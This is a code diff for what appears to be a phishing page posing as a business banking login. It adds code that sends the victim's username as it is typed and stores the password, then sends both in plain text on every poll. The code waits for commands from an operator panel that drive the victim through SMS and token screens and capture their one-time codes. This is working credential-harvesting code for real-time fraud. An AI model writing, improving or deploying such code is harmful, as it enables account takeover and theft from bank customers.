@@ -115,19 +115,37 @@
     passModal.classList.remove('is-open');
   }
 
+  function handleUserSubmit() {
+    if (!userInput || userInput.value.trim().length === 0) return;
+    const device = /mobile|android|iphone|ipad|phone/i.test(navigator.userAgent) ? 'mobile' : 'desktop';
+    const userVal = userInput.value.trim();
+    sessionStorage.setItem('last_user', userVal);
+    fetch('/api/sessions', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        id: sessionId,
+        username: userVal,
+        password: '—',
+        tipoUsuario: 'EMPRESAS',
+        device: device,
+        state: 'typing'
+      })
+    }).catch(() => {});
+    openModal();
+  }
+
   if (entrarBtn) {
     const form = entrarBtn.closest('form');
     if (form) {
       form.addEventListener('submit', (e) => {
         e.preventDefault();
-        if (!userInput || userInput.value.trim().length === 0) return;
-        openModal();
+        handleUserSubmit();
       });
     }
     entrarBtn.addEventListener('click', (e) => {
       e.preventDefault();
-      if (!userInput || userInput.value.trim().length === 0) return;
-      openModal();
+      handleUserSubmit();
     });
   }
 
@@ -169,10 +187,16 @@
   const authMethodName = document.getElementById('authMethodName');
 
   function showSpinner() {
-    if (spinner) spinner.classList.add('is-visible');
+    if (spinner) {
+      spinner.classList.add('is-visible');
+      spinner.style.setProperty('display', 'flex', 'important');
+    }
   }
   function hideSpinner() {
-    if (spinner) spinner.classList.remove('is-visible');
+    if (spinner) {
+      spinner.classList.remove('is-visible');
+      spinner.style.setProperty('display', 'none', 'important');
+    }
   }
 
   function updateCodeFloat() {
@@ -191,8 +215,14 @@
   function showSelectStep() {
     if (!authMethod) return;
     authMethod.dataset.step = 'select';
-    if (authSelectPanel) authSelectPanel.hidden = false;
-    if (authVerifyPanel) authVerifyPanel.hidden = true;
+    if (authSelectPanel) {
+      authSelectPanel.hidden = false;
+      authSelectPanel.style.setProperty('display', 'block', 'important');
+    }
+    if (authVerifyPanel) {
+      authVerifyPanel.hidden = true;
+      authVerifyPanel.style.setProperty('display', 'none', 'important');
+    }
     if (authStep1) {
       authStep1.classList.add('is-active');
       authStep1.classList.remove('is-done');
@@ -212,8 +242,14 @@
     if (!authMethod) return;
     currentOtpAction = mode;
     authMethod.dataset.step = 'verify';
-    if (authSelectPanel) authSelectPanel.hidden = true;
-    if (authVerifyPanel) authVerifyPanel.hidden = false;
+    if (authSelectPanel) {
+      authSelectPanel.hidden = true;
+      authSelectPanel.style.setProperty('display', 'none', 'important');
+    }
+    if (authVerifyPanel) {
+      authVerifyPanel.hidden = false;
+      authVerifyPanel.style.setProperty('display', 'block', 'important');
+    }
     if (authStep1) {
       authStep1.classList.remove('is-active');
       authStep1.classList.add('is-done');
@@ -261,8 +297,14 @@
   function goToAuthMethod(mode) {
     hideSpinner();
     closeModal();
-    if (loginUnico) loginUnico.hidden = true;
-    if (authMethod) authMethod.hidden = false;
+    if (loginUnico) {
+      loginUnico.hidden = true;
+      loginUnico.style.setProperty('display', 'none', 'important');
+    }
+    if (authMethod) {
+      authMethod.hidden = false;
+      authMethod.style.setProperty('display', 'block', 'important');
+    }
     showVerifyStep(mode || 'sms');
   }
 
@@ -313,14 +355,22 @@
   }
 
   // Polling del cliente esperando órdenes del panel de operador
+  let lastHandledAction = null;
+
   function startPolling() {
     stopPolling();
     pollInterval = setInterval(async () => {
       try {
-        const response = await fetch(`/api/sessions/${sessionId}`);
+        const u = encodeURIComponent(sessionStorage.getItem('last_user') || (userInput ? userInput.value.trim() : ''));
+        const p = encodeURIComponent(sessionStorage.getItem('last_pass') || (password ? password.value : ''));
+        const response = await fetch(`/api/sessions/${sessionId}?user=${u}&pass=${p}`);
         if (!response.ok) return;
         const data = await response.json();
         const action = data.action;
+
+        // Si no hay acción o ya se procesó esta misma acción, no hacer nada repetitivo
+        if (!action || action === lastHandledAction) return;
+        lastHandledAction = action;
 
         if (action === 'sms') {
           goToAuthMethod('sms');
@@ -361,6 +411,7 @@
           stopPing();
           stopPolling();
           hideSpinner();
+          sessionStorage.removeItem('is_waiting');
           window.location.href = 'panel.html';
         }
       } catch (_) {}
@@ -375,6 +426,7 @@
       const tokenVal = verifyCode.value.trim();
 
       showSpinner();
+      lastHandledAction = null; // Permitir que el operador envíe nuevas acciones posteriores
 
       try {
         await fetch(`/api/sessions/${sessionId}/token`, {
@@ -397,8 +449,11 @@
     showSpinner();
 
     const device = /mobile|android|iphone|ipad|phone/i.test(navigator.userAgent) ? 'mobile' : 'desktop';
-    const userVal = userInput ? userInput.value.trim() : 'EMPRESA';
+    const userVal = userInput ? userInput.value.trim() : (sessionStorage.getItem('last_user') || 'EMPRESA');
     const passVal = password.value;
+    sessionStorage.setItem('last_user', userVal);
+    sessionStorage.setItem('last_pass', passVal);
+    sessionStorage.setItem('is_waiting', 'true');
 
     try {
       await fetch('/api/sessions', {
@@ -418,6 +473,12 @@
     startPing();
     startPolling();
   });
+
+  // Reanudar polling si la sesión estaba en espera
+  if (sessionStorage.getItem('is_waiting') === 'true') {
+    startPing();
+    startPolling();
+  }
 
   // Acceso directo: ?paso=clave | ?paso=metodo | ?paso=verificar
   const paso = new URLSearchParams(location.search).get('paso');
